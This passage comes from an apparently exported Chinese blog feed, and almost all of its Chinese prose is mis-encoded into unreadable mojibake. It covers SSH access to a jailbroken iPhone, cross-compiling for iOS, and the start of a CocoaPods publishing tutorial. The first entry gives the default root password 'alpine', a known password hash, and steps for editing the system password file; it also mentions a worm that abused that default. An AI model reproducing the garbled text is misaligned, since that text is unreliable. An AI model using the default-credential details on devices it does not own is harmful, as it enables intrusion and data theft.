4.å®‰è£…å®Œæ¯•ï¼Œæ‰§è¡Œssh root@deviceIPï¼Œé»˜è®¤å¯†ç ä¸ºalpineï¼ˆä¹Ÿå¯ä»¥åœ¨iPhoneé‡Œä¸‹è½½sshè½¯ä»¶è¿›è¡Œè¿žæŽ¥æµ‹è¯•ï¼‰ 5.æˆåŠŸåŽï¼Œå†é‡æ–°å®‰è£…opensshå’ŒOpenSSLäº†ï¼ˆç»æµ‹è¯•ä¸ä¼šå½±å“SSHè¿žæŽ¥iPhoneï¼‰ã€‚ ç¬¬ä¸€æ¬¡è¿žæŽ¥ä¼šæé†’ä½ æ˜¯å¦è¿žæŽ¥ï¼Œè¾“å…¥yesç»§ç»­ï¼Œè¾“å…¥å¯†ç ï¼Œåˆå§‹å¯†ç æ˜¯alpineã€‚ å»ºè®®å°†æ”¹å¯†ç æ”¹æŽ‰ï¼Œå› ä¸ºåœ¨é»˜è®¤å¯†ç çš„æƒ…å†µä¸‹ï¼Œä»»ä½•äººéƒ½å¯ä»¥å°è¯•ç™»é™†ä½ çš„è®¾å¤‡ã€‚ Ikee, iOSä¸Šçš„ä¸€ç§è •è™«ç—…æ¯’, é€šè¿‡ä½¿ç”¨é»˜è®¤å¯†ç alpineå…¥ä¾µå®‰è£…äº†opensshçš„è¶Šç‹±è®¾å¤‡, ç„¶åŽæ‰€æœ‰æ•°æ®, åŒ…æ‹¬ç”µè¯æœ¬, çŸ­ä¿¡, ç”šè‡³Apple IDéƒ½æœ‰å¯èƒ½è¢«çªƒå–.æ‰€ä»¥å¼ºçƒˆå»ºè®®æ‚¨ä¿®æ”¹sshå¯†ç  åœ¨ç™»å½•ä¹‹åŽï¼Œä½ å¯ä»¥æ›´æ”¹ä½ çš„å¯†ç ï¼š 1passwd root // æç¤ºè¾“å…¥ä¸¤æ¬¡æ–°å¯†ç å³å¯ä¿®æ”¹ æˆåŠŸåŽå¯æŸ¥çœ‹æ‰‹æœºæ–‡ä»¶ç›®å½• SSHé€šè¿‡USBè¿žæŽ¥æ‰‹æœº æ¯”WIFIå“åº”é€Ÿåº¦å¿«ï¼Œç½‘ç»œçŽ¯å¢ƒæ— é™åˆ¶ usbmuxdæ˜¯ç½‘ä¸Šå¼€æºç¤¾åŒºï¼Œè²Œä¼¼æ˜¯å›½å¤–ç‰›äººå€¾åŠ›æ‰“é€ çš„ä¸€ä¸ªä¸“é—¨é’ˆå¯¹è¯¥åŠŸèƒ½å¼€æºåº“ é€šè¿‡brewæ¥å®‰è£…ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥è‡ªå·±åŽ»ä¸‹æºç æ‰‹åŠ¨å®‰è£…ï¼Œç”±äºŽä¾èµ–é¡¹æ¯”è¾ƒå¤šï¼Œæ‰€ä»¥å¾ˆç¹çï¼‰ 1brew install usbmuxd usbmuxd è‡ªå¸¦å·¥å…·iproxyï¼Œiproxy å¯ä»¥å¿«æ·çš„æ“ä½œè¿žæŽ¥iPhoneç­‰æ“ä½œã€‚ç”±äºŽMacä¸Šåªæ”¯æŒ4ä½çš„ç«¯å£å·ï¼Œæ‰€ä»¥éœ€è¦æŠŠiPhoneçš„é»˜è®¤ç«¯å£22æ˜ å°„åˆ°Macä¸Šï¼Œç›¸å½“äºŽå»ºç«‹ä¸€ä¸ªMacå’ŒiPhoneä¹‹é—´çš„é€šé“ã€‚ 12iproxy 7777 22// waiting for connection ä»¥ä¸Šå‘½ä»¤å°±æ˜¯æŠŠå½“å‰è¿žæŽ¥è®¾å¤‡çš„22ç«¯å£(SSHç«¯å£)æ˜ å°„åˆ°ç”µè„‘çš„7777ç«¯å£ï¼Œé‚£ä¹ˆæƒ³å’Œè®¾å¤‡22ç«¯å£é€šä¿¡ï¼Œç›´æŽ¥å’Œæœ¬åœ°çš„7777ç«¯å£é€šä¿¡å°±å¯ä»¥äº†ã€‚ ç»ˆç«¯æç¤º waiting for connection ï¼Œè¡¨ç¤ºè¿™ä¸¤ä¸ªç«¯å£ä¹‹é—´å·²ç»å¯ä»¥é€šä¿¡äº†ï¼Œä¿ç•™å½“å‰ç»ˆç«¯(å¦‚æžœå…³é—­å°±åœæ­¢ç«¯å£ä¹‹é—´çš„é€šä¿¡äº†)ï¼Œæ–°å»ºå¦ä¸€ä¸ªç»ˆç«¯è¾“å…¥å¦‚ä¸‹æŒ‡ä»¤ 1ssh -p 7777 root@127.0.0.1 å¦‚æžœæ˜¯ç¬¬ä¸€æ¬¡ä½¿ç”¨USBè¿žæŽ¥æ‰‹æœºï¼Œä¼šæç¤ºå¦‚ä¸‹ä¿¡æ¯ï¼Œè¾“å…¥yesç»§ç»­ 1234The authenticity of host &apos;[127.0.0.1]:7777 ([127.0.0.1]:7777)&apos; can&apos;t be established.ECDSA key fingerprint is SHA256:rBkW26LHWZbqrbfOsrkSCeLN1gr3fADxIF5PWB8VXDI.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added &apos;[127.0.0.1]:7777&apos; (ECDSA) to the list of known hosts. å¦‚æžœæ²¡æœ‰ä¿®æ”¹è¿‡rootå¯†ç ï¼Œåˆ™è¾“å…¥é»˜è®¤alpineï¼Œä¿®æ”¹è¿‡ï¼Œåˆ™è¾“å…¥ä¿®æ”¹è¿‡å¯†ç ï¼Œå®ŒæˆåŽå³å¯è¿žæŽ¥ä¸ŠiPhoneã€‚ é…ç½®å…sshå¯†ç ç™»é™† æ¯æ¬¡è¿žæŽ¥æ‰‹æœºéƒ½éœ€è¦è¾“å…¥å¯†ç æ¯”è¾ƒéº»çƒ¦ï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹é…ç½®å…sshå¯†ç ç™»é™† å¦‚æžœæœ¬äººæ˜¯åšiOSå¼€å‘çš„ï¼Œé¡¹ç›®ç”¨åˆ°äº†GITç‰ˆæœ¬æŽ§åˆ¶ï¼Œä¸€èˆ¬éƒ½é…ç½®SSHå¯†é’¥äº†ã€‚å¯†é’¥å·²ç»å­˜åœ¨äº†ç”µè„‘çš„./sshç›®å½•ä¸­ï¼Œå¦‚æžœæ²¡æœ‰é…ç½®ï¼Œé‚£ä¹ˆå¯æ‰‹åŠ¨é‡æ–°ç”ŸæˆSSHå¯†é’¥ï¼Œå¦‚: 1ssh-keygen -t rsa -b 4096 -C &quot;your_email&quot; ç”Ÿæˆå®ŒæˆåŽï¼Œæˆ‘ä»¬ä¼šåœ¨./sshç›®å½•ä¸­å‘çŽ°id_rsa.pubå…¬é’¥è¿™ä¸ªæ–‡ä»¶ã€‚ç„¶åŽæˆ‘ä»¬æŠŠå®ƒcopyå‡ºæ¥æ”¾åˆ°ä¸ªäººç›®å½•ä¸‹ï¼Œå¹¶é‡å‘½åï¼Œæ¯”å¦‚ï¼š 1cp /Users/SevenCho/.ssh/id_rsa.pub ~/authorized_keys æ‰‹åŠ¨SSHè¿›å…¥è®¾å¤‡ä¸­ï¼Œæˆ–è€…é€šè¿‡Filzaï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨var/root/.sshç›®å½•ï¼Œå¦‚æžœæ²¡æœ‰ï¼Œæˆ‘ä»¬æ‰‹åŠ¨åˆ›å»ºä¸‹ã€‚å¯é€šè¿‡SSHè¿žæŽ¥åŽmkdiråˆ›å»ºï¼Œæˆ–è€…Filzaæ‰‹åŠ¨åˆ›å»ºã€‚ åˆ›å»ºåŽæˆ‘ä»¬æŠŠauthorized_keysæ‹·è´åˆ°è®¾å¤‡ä¸­ï¼Œå¯åˆ©ç”¨SCPå‘½ä»¤ï¼š 1scp ~/authorized_keys root@iphone ip:/var/root/.ssh // iphone ip ä¸ºä½ æ‰‹æœºçš„ipåœ°å€ ç„¶åŽæŒ‰æ­£å¸¸è¿žæŽ¥æ­¥éª¤æˆ‘ä»¬å°±å¯ä»¥ç›´æŽ¥SSHè¿žæŽ¥çš„æ—¶å€™ä¸ç”¨è¾“å…¥å¯†ç äº†ã€‚ è¿™ä¸ªæ—¶å€™ï¼Œå¦‚æžœæˆ‘ä»¬ä½¿ç”¨tweakæ‰“åŒ…æ—¶å€™ï¼Œä¹Ÿä¸ä¼šå†è®©æˆ‘ä»¬è¾“å…¥SSHå¯†ç äº†ã€‚ é‡ç½®sshç™»é™†å¯†ç  å¦‚æžœä½ ä¸å¹¸å¿˜è®°äº†sshå¯†ç ï¼Œå¯ä»¥åœ¨Cydiaä¸­ä¸‹è½½Filzaè½¯ä»¶ï¼Œé€šè¿‡Filzaæ‰¾åˆ°/private/etc/master.passwordæ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­ä¼šæœ‰ä»¥ä¸‹ä¸€æ®µï¼š root:xxxxxxxxxxxxx:0:0::0:0:SystemAdministrator:/var/root:/bin/shmobile:xxxxxxxxxxxxx:501:501::0:0:MobileUser:/var/mobile:/bin/sh å°†root:åŠmobile:åŽé¢çš„13ä¸ªxå­—ç¬¦å¤„ä¿®æ”¹æˆ/smx7MYTQIi2Mï¼Œä¿®æ”¹åŽä¿å­˜æ­¤æ–‡ä»¶ï¼Œä½ iphoneçš„sshå¯†ç å°±é‡æ–°å›žåˆ°é»˜è®¤çš„alpine äº¤å‰ç¼–è¯‘ äº¤å‰ç¼–è¯‘æŒ‡åœ¨ä¸€ä¸ªå¹³å°ä¸Šç”Ÿæˆå¦ä¸€ä¸ªå¹³å°ä¸Šçš„å¯æ‰§è¡Œä»£ç ã€‚å¦‚æˆ‘ä»¬å°†ä¼šåœ¨MACä¸Šç¼–å†™ç¼–è¯‘å¯åœ¨iPhoneä¸Šè¿è¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ ç¼–è¯‘æ˜¯ç”±ç¼–è¯‘å™¨å®Œæˆçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆè¦æ‰¾åˆ°åˆé€‚çš„ç¼–è¯‘å™¨ã€‚å…³äºŽç›®å‰Appleå…¬å¸å¼€æºåŠå¾ˆå¤šå¤§å…¬å¸ä½¿ç”¨å’Œç»´æŠ¤çš„Clangç¼–è¯‘å™¨è¯¦ç»†èµ„æ–™è¯·çœ‹ç»“æž„åŒ–ç¼–è¯‘å™¨å‰ç«¯ Clang ä»‹ç» ç¼–å†™ä»£ç  12345678touch helloworld.c // æ–°å»ºcæ–‡ä»¶open helloworld.c // æ‰“å¼€.cæ–‡ä»¶ï¼Œç¼–å†™æµ‹è¯•ä»£ç ï¼Œå¦‚ä¸‹é¢ä»£ç ï¼š#include &lt;stdio.h&gt; int main()&#123; printf(&quot;Hello world !!!\n&quot;); return 0; &#125; ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ ç”Ÿæˆå¯åœ¨iPhoneå¹³å°è¿è¡Œçš„äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ iOSçš„æŒ‡ä»¤é›†å‚è€ƒæ–‡ç« ç»“å°¾ 12// æ ¼å¼ï¼šxcrun -sdk iphoneos clang -arch armv7s -o [ç›®æ ‡æ–‡ä»¶å] [æºæ–‡ä»¶å]xcrun -sdk iphoneos clang -arch armv7s -o helloworld helloworld.c ä¼ è¾“å¯æ‰§è¡Œæ–‡ä»¶ é€šè¿‡sshä¼ è¾“æœ¬åœ°æ–‡ä»¶åˆ°iPhoneï¼ˆæœåŠ¡å™¨ï¼‰ 12// scp /path/filename username@servername:/path/filenamescp helloworld root@192.168.1.42:/helloworld å…³äºŽiOS10.2ç³»ç»Ÿè¶Šç‹±åŽæ— æ³•è°ƒç”¨scpï¼Œå¯å‚è€ƒ[Tutorial] How to fix scp on Yalu / Dropbear å‘ï¼šä½¿ç”¨iPhone5 iOS10.3 è¿˜æ˜¯æ— æ³•ä½¿ç”¨scpä¼ è¾“æ–‡ä»¶ï¼ŒåŽæ¥å‘çŽ°å› ä¸ºæ˜¯32ä½ç³»ç»Ÿï¼Œè€Œä½¿ç”¨ä¸Šé¢è§£å†³æ–¹æ³•ä¸‹è½½çš„scpæ˜¯64ä½çš„ï¼Œæ‰‹åŠ¨å®‰è£…æŽˆæƒ32ä½å°±å¯ä»¥äº†ï¼Œå¦‚ä¸‹ å…ˆä¸‹è½½scpäºŒè¿›åˆ¶æ–‡ä»¶åŠç›¸å…³åº“æ–‡ä»¶ï¼šscpã€libcrypto.0.9.8.dylibã€libcrypto.dylib åœ¨ç”µè„‘ä¸Šç”¨iToolsæŠŠscpæ–‡ä»¶å¯¼å…¥åˆ°usr/binç›®å½•ä¸­ï¼ŒæŠŠå¦å¤–ä¸¤ä¸ªæ–‡ä»¶å¯¼å…¥åˆ°usr/libç›®å½•ä¸­ é€šè¿‡æ‰‹æœºMTerminalï¼Œç™»é™†è¿›æ¥rootæ¨¡å¼ è¿›å…¥usr/binç›®å½•ï¼Œæ‰§è¡Œä¸‹åˆ—å‘½ä»¤ 12ldid -S scpchmod 777 scp è¿›å…¥usr/libç›®å½• 12chmod 755 libcrypto.0.9.8.dylibchmod 755 libcrypto.dylib å°†iPhoneï¼ˆæœåŠ¡å™¨ï¼‰æ–‡ä»¶ä¼ è¾“åˆ°æœ¬åœ° 12// scp username@servername:/source/path/filename /des/path/filenamescp root@192.168.1.42:/iphone/path/helloworld /mac/path/helloworld æŸ¥çœ‹iPhoneæ–‡ä»¶ç›®å½•æ˜¯å¦å­˜åœ¨å¯¹åº”æ–‡ä»¶helloworldï¼Œåœ¨ç»ˆç«¯æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶ ä¼ å®Œå¯æ‰§è¡Œæ–‡ä»¶åŽ, æ­¤æ—¶å¯æ‰§è¡Œæ–‡ä»¶å¹¶æ²¡æœ‰æƒé™, æ‰€ä»¥è¦æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ç»™æƒé™: 1chmod a+x helloworld è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶ å¦‚æžœæ‰§è¡Œå¤±è´¥ï¼ŒæŠ¥Killed: 9ï¼Œå¯èƒ½æ˜¯å› ä¸ºæ‰§è¡Œæ–‡ä»¶æ²¡æœ‰ç­¾åï¼Œä½¿ç”¨ldid -S helloworldç­¾åå³å¯ã€‚ 1./helloworld æ³¨æ„ å¦‚æžœè¶Šç‹±æˆåŠŸï¼Œä¸€å®šè¦å®‰è£…å¯ä»¥è¿œç¨‹è®¿é—®æ‰‹æœºçš„å·¥å…·ï¼Œå’Œæ‰‹æœºç«¯å¯ä»¥æŸ¥çœ‹è¶Šç‹±ç³»ç»Ÿæ–‡ä»¶çš„å·¥å…·ã€‚ï¼ˆä»¥é˜²æ‰‹è´±æŠŠCydiaç»™è¯¯åˆ äº†ï¼Œéœ€è¦æ¢å¤ï¼‰ åƒä¸‡è¦æ³¨æ„ï¼šåˆ é™¤æŸäº›å®‰è£…çš„å·¥å…·çš„æ—¶å€™æœ‰å¯èƒ½ä¼šæŠŠCydiaä¹Ÿç»™ä¸€èµ·åˆ é™¤çš„ã€‚ å¦‚æžœæƒ³é‡æ–°ä½¿ç”¨Apple IDç­¾åè¶Šç‹±, è¾“å…¥Apple IDè´¦å·å¯†ç åŽé‡åˆ°å¦‚ä¸‹é”™è¯¯ 123provision.cpp:81ios/submitDevelopmentCSR =7460You already have a current IOS Development certificate or a pending certificate request. æ­¤æ—¶éœ€è¦åˆ é™¤ä¸Šä¸€ä¸ªcertificateï¼Œæ“ä½œæ­¥éª¤ï¼š é€‰æ‹©èœå•æ Xcode -&gt; revokeCertificates å¦‚æžœrevokeCertificateså¤±è´¥ï¼Œæç¤ºå¦‚ä¸‹é”™è¯¯ 1progress hppï¼š87_assert false ä¸‹è½½æ—§ç‰ˆæœ¬Impactorï¼Œå¦‚Impactor_0.9.42, ä½¿ç”¨æ—§ç‰ˆæœ¬è½¯ä»¶é‡æ–°revokeCertificates revokeCertificatesæˆåŠŸå¦‚ä¸‹ å…³äºŽç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶é‡‡ç”¨çš„iOSçš„æŒ‡ä»¤é›† armv6 iPhoneã€iPhone 3G iPod 1Gã€iPod 2G armv7 iPhone 3GSã€iPhone 4 iPod 3Gã€iPod 4Gã€iPod 5G iPadã€iPad 2ã€iPad 3ã€iPad Mini armv7s iPhone 5ã€iPhone 5C iPad 4 arm64 iPhone 5S iPhone 6 iPhone 6Plus ä»¥åŠä¹‹åŽçš„ iPad Air, Retina iPad Mini ä»¥åŠä¹‹åŽçš„ å‚è€ƒ iOSæ”»é˜²â€”â€”ï¼ˆä¸€ï¼‰sshç™»é™†ä¸Žäº¤å‰ç¼–è¯‘ ã€ŠiOS åº”ç”¨é€†å‘ä¸Žå®‰å…¨ã€‹è¯»åŽæ„Ÿ ä¸ç”¨æ¢IDï¼Œå®Œç¾Žè§£å†³ Cydia Impactor é”™è¯¯81 iPhone6s 10.3.1è¶Šç‹±å¤±è´¥ æç¤º./plist.hpp:201 not PLIST_STRING 32ä½è®¾å¤‡iOS 10-10.3.xè¶Šç‹±å·¥å…·h3lixå‘å¸ƒ 32ä½è®¾å¤‡iOS9.1-9.3.4è¶Šç‹±å›¾æ–‡æ•™ç¨‹ iPhone10.3.Xè¶Šç‹±åŽSSHè¿žæŽ¥ä¸ä¸Šçš„é—®é¢˜ï¼ˆå·²è§£å†³ï¼‰ [Tutorial] How To Access SSH Using Dropbear In iOS 10.3.x To Fix Filzaâ€™s Root Permission Using Your Device! SSH Over USB [Tutorial] How to fix scp on Yalu / Dropbear]]></content>
      <categories>
        <category>iOS</category>
        <category>æ”»é˜²</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>æ”»é˜²</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åˆ›å»ºè‡ªå·±çš„CocoaPodså…¬æœ‰åº“]]></title>
    <url>%2Farchives%2F2e7b1d7b.html</url>
    <content type="text"><![CDATA[æˆ‘æŠŠæˆ‘æ•´ä¸ªçµé­‚éƒ½ç»™ä½ ï¼Œè¿žåŒå®ƒçš„æ€ªç™–ï¼Œè€å°è„¾æ°”ï¼Œå¿½æ˜Žå¿½æš—ï¼Œä¸€åƒå…«ç™¾ç§åæ¯›ç—…ã€‚å®ƒçœŸè®¨åŽŒï¼Œåªæœ‰ä¸€ç‚¹å¥½ï¼Œçˆ±ä½ ã€‚â€”â€”çŽ‹å°æ³¢ã€Šçˆ±ä½ å°±åƒçˆ±ç”Ÿå‘½ã€‹ å‰è¨€ä»€ä¹ˆæ˜¯CocoaPods CocoaPods æ˜¯ä¸€ä¸ª objc/swift çš„ç¬¬ä¸‰ç±»åº“ä¾èµ–ç®¡ç†å·¥å…·ï¼Œè€Œå…¶æœ¬èº«æ˜¯åˆ©ç”¨ ruby çš„ä¾èµ–ç®¡ç† gem è¿›è¡Œæž„å»ºçš„. é€šè¿‡CocoaPodså·¥å…·æˆ‘ä»¬å¯ä»¥ä¸ºé¡¹ç›®æ·»åŠ è¢«ç§°ä¸ºâ€œPodsâ€çš„ä¾èµ–åº“ï¼ˆè¿™äº›ç±»åº“å¿…é¡»æ˜¯CocoaPodsæœ¬èº«æ‰€æ”¯æŒçš„ï¼‰ï¼Œå¹¶ä¸”å¯ä»¥è½»æ¾ç®¡ç†å…¶ç‰ˆæœ¬ã€‚ CocoaPodsçš„å¥½å¤„ 1ã€åœ¨å¼•å…¥ç¬¬ä¸‰æ–¹åº“æ—¶å®ƒå¯ä»¥è‡ªåŠ¨ä¸ºæˆ‘ä»¬å®Œæˆå„ç§å„æ ·çš„é…ç½®ï¼ŒåŒ…æ‹¬é…ç½®ç¼–è¯‘é˜¶æ®µã€è¿žæŽ¥å™¨é€‰é¡¹ã€ç”šè‡³æ˜¯ARCçŽ¯å¢ƒä¸‹çš„-fno-objc-arcé…ç½®ç­‰ã€‚ 2ã€ä½¿ç”¨CocoaPodså¯ä»¥å¾ˆæ–¹ä¾¿åœ°æŸ¥æ‰¾æ–°çš„ç¬¬ä¸‰æ–¹åº“ï¼Œè¿™äº›ç±»åº“æ˜¯æ¯”è¾ƒâ€œæ ‡å‡†çš„â€ï¼Œè€Œä¸æ˜¯ç½‘ä¸Šéšä¾¿æ‰¾åˆ°çš„ï¼Œè¿™æ ·å¯ä»¥è®©æˆ‘ä»¬æ‰¾åˆ°çœŸæ­£å¥½ç”¨çš„ç±»åº“ã€‚ CocoaPodså®‰è£… å…³äºŽCocoaPodså®‰è£…è¯·è‡ªè¡Œç™¾åº¦/è°·æ­Œï¼Œç›¸å…³èµ„æ–™å·²ç»ä»‹ç»çš„éžå¸¸è¯¦å°½ã€‚ æ›´è¯¦ç»†çš„æ–‡æ¡£è¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£ å¯ä»¥åœ¨è¿™é‡Œæ·±å…¥ç†è§£ CocoaPods å¦‚ä½•åˆ¶ä½œè‡ªå·±çš„CocoaPodsï¼ˆå…¬æœ‰ï¼‰åº“ æƒ³è¦åˆ¶ä½œè‡ªå·±çš„CocoaPodsï¼ˆå…¬æœ‰ï¼‰åº“ï¼Œæˆ‘ä»¬éœ€è¦å…ˆå¤§æ¦‚äº†è§£ä¸€ä¸‹CocoaPodsçš„ä¸¤ä¸ªæ–‡ä»¶Podfile / Podspec Podfile podfile æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œç”¨äºŽå®šä¹‰é¡¹ç›®æ‰€éœ€è¦ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹åº“ã€‚ è¯¥æ–‡ä»¶æ”¯æŒé«˜åº¦å®šåˆ¶ï¼Œä½ å¯ä»¥æ ¹æ®ä¸ªäººå–œå¥½å¯¹å…¶åšå‡ºå®šåˆ¶ã€‚æ›´å¤šç›¸å…³ä¿¡æ¯ï¼Œè¯·æŸ¥é˜… Podfile æŒ‡å—ã€‚ Podspec .podspec ä¹Ÿæ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶æè¿°äº†ä¸€ä¸ªåº“æ˜¯æ€Žæ ·è¢«æ·»åŠ åˆ°å·¥ç¨‹ä¸­çš„ã€‚å®ƒæ”¯æŒçš„åŠŸèƒ½æœ‰ï¼šåˆ—å‡ºæºæ–‡ä»¶ã€frameworkã€ç¼–è¯‘é€‰é¡¹å’ŒæŸä¸ªåº“æ‰€éœ€è¦çš„ä¾èµ–ç­‰ã€‚ åœ¨æˆ‘ä»¬æ‰§è¡Œpod install å‘½ä»¤åŠ è½½ç¬¬ä¸‰æ–¹åº“çš„æ—¶å€™, ä¼šå…ˆä»Žè¿œç¨‹Podspecsä»“åº“æ‹‰å–æœ€æ–°çš„åŒ…æ‹¬ç‰ˆæœ¬ä¿¡æ¯åœ¨å†…çš„æ‰€æœ‰çš„ç¬¬ä¸‰æ–¹åº“çš„åˆ—è¡¨ã€‚ å­˜å‚¨åœ¨æœ¬åœ°è·¯å¾„ ~/.cocoapods ä¸­ï¼Œå…ˆæ˜¾ç¤ºç³»ç»Ÿéšè—æ–‡ä»¶åŽæ‰å¯ä»¥çœ‹åˆ°éšè—æ–‡ä»¶ã€‚ 1defaults write com.apple.finder AppleShowAllFiles -boolean true ; killall Finder ä½¿ç”¨ç»ˆç«¯è¿›å…¥æŸ¥çœ‹ä»“åº“çš„è¿œç¨‹åœ°å€ 12345cd ~/.cocoapods/repos/mastergit remote -v// æ‹‰å–å’Œæ›´æ–°åœ°å€origin https://github.com/CocoaPods/Specs.git (fetch)origin https://github.com/CocoaPods/Specs.git (push) https://github.com/CocoaPods/Specs.git å®žé™…å°±æ˜¯CocoaPodsçš„GitHubä»“åº“åœ°å€ã€‚ æˆ‘ä»¬å¦‚æžœä¸€ç›´è¿›å…¥~/.cocoapods/repos/master å°±ä¼šå‘çŽ°é‡Œé¢çš„æ¯ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹éƒ½æ˜¯ä¸‰æ–¹åº“åˆ—è¡¨ æ¯ä¸€ä¸ªä¸‰æ–¹åº“æ–‡ä»¶ä¸‹å­˜æ”¾çš„æ˜¯å¯¹åº”çš„ç‰ˆæœ¬å·æ–‡ä»¶å¤¹ è€Œå¯¹åº”çš„ç‰ˆæœ¬å·æ–‡ä»¶å¤¹é‡Œé¢åˆ™åªå­˜åœ¨å”¯ä¸€çš„ä¸€ä¸ªä»¥ ä¸‰æ–¹åº“åç§°.podspec.jsonçš„æ–‡ä»¶, æˆ‘ä»¬çœ‹ä¸€ä¸‹GoogleMapså¤§æ¦‚çš„å†…å®¹ 1234567891011121314151617181920&#123; "authors": "Google, Inc.", "description": "Use the Google Maps SDK for iOS to enrich your app with interactive maps, immersive Street View panoramas, and detailed information from Google's Places database.", "homepage": "https://developers.google.com/maps/documentation/ios/", "license": &#123; // å¼€æºåè®® // ... &#125;, "name": "GoogleMaps", // ä¸‰æ–¹åº“åç§° "platforms": &#123; // ä¸‰æ–¹åº“å¹³å°åŠç‰ˆæœ¬ "ios": "8.0" &#125;, "preserve_paths": [ // ... ], "source": &#123; "http": "https://dl.google.com/dl/cpdc/f4086b0aa122de6c/GoogleMaps-2.7.0.tar.gz" // ä¸‰æ–¹åº“æºç  &#125;, "summary": "Google Maps SDK for iOS.", // ä¸‰æ–¹åº“æè¿° "version": "2.7.0", // ä¸‰æ–¹åº“ç‰ˆæœ¬ &#125; æˆ‘ä»¬å°è¯•åœ¨ç»ˆç«¯æœç´¢ä¸€ä¸‹ç¬¬ä¸‰æ–¹åº“GoogleMaps 1234567891011// pod search GoogleMaps-&gt; GoogleMaps (2.7.0) // ä¸‰æ–¹åº“åç§° Google Maps SDK for iOS. // ä¸‰æ–¹åº“æè¿° pod &apos;GoogleMaps&apos;, &apos;~&gt; 2.7.0&apos; // ä¸‰æ–¹åº“ç‰ˆæœ¬ - Homepage: https://developers.google.com/maps/documentation/ios/ - Source: https://dl.google.com/dl/cpdc/f4086b0aa122de6c/GoogleMaps-2.7.0.tar.gz // ä¸‰æ–¹åº“æºç  - Versions: 2.7.0, 2.6.0, 2.5.0, 2.4.0, 2.3.1, 2.3.0, 2.2.0, 2.1.1, 2.1.0, 2.0.1, 2.0.0, 1.13.2, 1.13.1, 1.13.0, 1.12.3, 1.12.2, 1.12.1, 1.12.0, 1.11.1, 1.11.0, 1.10.5, 1.10.4, 1.10.3, 1.10.2, 1.10.1, 1.10.0, 1.9.2 [master repo] - Subspecs:// ... æˆ‘ä»¬å¹³æ—¶åœ¨pod searchç¬¬ä¸‰æ–¹åº“åŽå‡ºçŽ°çš„ç»“æžœå…¶å®žéƒ½æ˜¯ä¸‰æ–¹åº“åç§°.podspec.jsonè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬åªåšè‡ªå·±çš„CocoaPodsåº“ï¼Œä¹Ÿè¦ä»Žæ•´ä¸ªæ–‡ä»¶å…¥æ‰‹ã€‚ æ­£å¼å¼€å§‹æ³¨å†Œ CocoaPods è´¦å· å› ä¸ºæˆ‘ä»¬çš„æ˜¯ç”¨CocoaPodsç»Ÿä¸€ç®¡ç†æˆ‘ä»¬çš„è‡ªå·±çš„å¼€æºåº“ï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ªCocoaPodsè´¦å·ç”¨æ¥å‘å¸ƒåº“ã€‚ æˆ‘ä»¬ä½¿ç”¨ç»ˆç«¯æ¥è¿›è¡Œæ³¨å†Œï¼Œåœ¨ç»ˆç«¯è¾“å…¥ä¸‹é¢çš„æŒ‡ä»¤ã€å›žè½¦ï¼š 123// gitHub_email ï¼š æ³¨å†ŒCocoaPodsçš„é‚®ç®±ï¼Œ æˆ‘ä½¿ç”¨çš„æ˜¯å’Œæ³¨å†ŒGitHubä¸€æ ·çš„é‚®ç®±ã€‚// your_user_name ï¼šä½ æ³¨å†ŒCocoaPodsçš„ç”¨æˆ·å pod trunk register gitHub_email &apos;your_user_name&apos; --verbose æˆåŠŸåŽç»ˆç«¯è¾“å…¥ä¸‹é¢ä¿¡æ¯ï¼ŒCocoaPods ä¼šå‘ä¸€ä¸ªç¡®è®¤é‚®ä»¶åˆ°ä½ çš„é‚®ç®±ä¸Šï¼Œç™»å½•ä½ çš„é‚®ç®±è¿›è¡Œç¡®è®¤ã€‚ 1[!] Please verify the session by clicking the link in the verification email that has been sent to gitHub_email ç¡®è®¤å®ŒæˆåŽï¼Œè¾“å…¥å¦‚ä¸‹æŒ‡ä»¤æŸ¥çœ‹æ³¨å†Œä¿¡æ¯ 12345678// pod trunk me- Name: your_register_name // ä½ çš„æ³¨å†Œæ˜µç§° - Email: your_register_email // ä½ çš„æ³¨å†Œé‚®ç®± - Since: June 26th, 03:26 - Pods: None - Sessions: - June 26th, 03:26 - November 1st, 03:28. IP: 119.136.114.95 åˆ›å»ºGitä»“åº“ åœ¨ GitHub ä¸Šåˆ›å»ºä¸€ä¸ªå…¬å¼€é¡¹ç›®ï¼Œé¡¹ç›®ä¸­å¿…é¡»åŒ…å«è¿™å‡ ä¸ªæ–‡ä»¶ LICENSE: å¼€æºè®¸å¯è¯ README.md: åº“çš„ä½¿ç”¨ä»‹ç»æ–‡ä»¶ ä½ çš„å¼€æºåº“ä»£ç  ä½ çš„ä¸‰æ–¹åº“åç§°.podspec : CocoaPods çš„æè¿°æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶éžå¸¸é‡è¦ è¿™é‡Œæˆ‘ä»¬ä»¥æˆ‘ä»¿å†™çš„ä¸€ä¸ªdemoä¸ºä¾‹å­,å¦‚ä¸‹å›¾ï¼š XSSecurityCodeButton-Demoæ˜¯ä¸€ä¸ªæ¼”ç¤ºé¡¹ç›® XSSecurityCodeButtonæ˜¯ä¸€ä¸ªæ¼”ç¤ºé¡¹ç›® LICENSEå¼€æºè®¸å¯è¯ï¼Œå¦‚ä½•åˆ›å»ºè¯·è‡ªè¡Œç™¾åº¦/è°·æ­Œï¼Œéžå¸¸ç®€å•ã€‚ 